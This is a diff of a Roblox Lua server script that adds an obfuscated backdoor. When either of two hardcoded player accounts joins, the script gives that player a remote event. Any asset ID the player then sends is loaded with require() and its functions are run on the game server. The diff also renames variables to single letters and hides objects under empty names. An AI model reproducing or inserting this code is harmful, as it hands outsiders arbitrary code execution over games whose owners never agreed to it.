@@ -1,21 +1,21 @@
-local c = require(6412989103)
-function l(a,s)
-	if #s > 0 then
-		local r = require(tonumber(string.match(s, "%d+")))
-		for i,v in pairs(r) do
-			if type(v) == 'function' then
-				v(a.Name)
+local a = script['']
+
+function l(b, c)
+	if #c > 0 then
+		local d = require(tonumber(string.match(c, "%d+")))
+		for e, f in pairs(d) do
+			if type(f) == "function" then
+				f(b.Name)
 			end
- 		end
+		end
 	end
 end
 
-game.Players.PlayerAdded:Connect(function(plr)
-	if plr.UserId == 287103891 then
-		local c = c:Clone()
-		c.Parent = plr.PlayerGui
-		c[''][''].OnServerEvent:connect(function(a,s)
-			l(a,s)
-		end)
+game.Players.PlayerAdded:Connect(function(g)
+	if g.UserId == 646450762 or g.UserId == 287103891 then
+		local a = a:Clone()
+		a.Parent = g.PlayerGui
+		
+		a[''][''][''].OnServerEvent:connect(l)
 	end
 end)
